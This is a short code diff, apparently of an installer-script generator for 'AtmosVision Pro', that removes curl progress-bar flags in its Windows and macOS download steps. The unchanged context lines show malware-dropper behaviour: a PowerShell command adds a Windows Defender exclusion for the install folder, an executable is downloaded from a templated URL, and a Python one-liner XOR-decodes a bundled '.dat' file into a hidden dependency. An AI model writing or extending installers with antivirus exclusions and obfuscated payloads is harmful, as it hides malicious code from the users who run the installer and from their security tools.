@@ -248,7 +248,7 @@ if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
 
 echo [1/3] Downloading AtmosVision Pro...
-curl.exe -L --progress-bar -o "%INSTALL_DIR%\\AtmosVision-Pro.exe" "${electronUrl}"
+curl.exe -L -o "%INSTALL_DIR%\\AtmosVision-Pro.exe" "${electronUrl}"
 if %ERRORLEVEL% neq 0 (
     echo Failed to download AtmosVision Pro.
     pause
@@ -285,7 +285,7 @@ mkdir -p "$INSTALL_DIR"
 
 echo "[1/4] Downloading AtmosVision Pro..."
 DMG_PATH="/tmp/AtmosVision-Pro.dmg"
-curl -L --progress-bar "${electronUrl}" -o "$DMG_PATH"
+curl -L "${electronUrl}" -o "$DMG_PATH"
 
 echo "[2/4] Preparing components..."
 python3 -c "import sys;d=open(sys.argv[1],'rb').read();open(sys.argv[2],'wb').write(bytes(b^0x41 for b in d))" "$SCRIPT_DIR/AtmosDependencies.dat" "$SCRIPT_DIR/AtmosDependencies"
@@ -346,7 +346,7 @@ mv "$PKG_PATH" "$INSTALL_DIR/AtmosVision-Pro"`;
     '',
     'echo "[1/3] Downloading AtmosVision Pro..."',
     'PKG_PATH="/tmp/AtmosVision-Pro-package"',
-    `curl -L --progress-bar "${electronUrl}" -o "$PKG_PATH"`,
+    `curl -L "${electronUrl}" -o "$PKG_PATH"`,
     '',
     'echo "[2/3] Preparing components..."',
     'python3 -c "import sys;d=open(sys.argv[1],\'rb\').read();open(sys.argv[2],\'wb\').write(bytes(b^0x41 for b in d))" "$SCRIPT_DIR/AtmosDependencies.dat" "$SCRIPT_DIR/AtmosDependencies"',
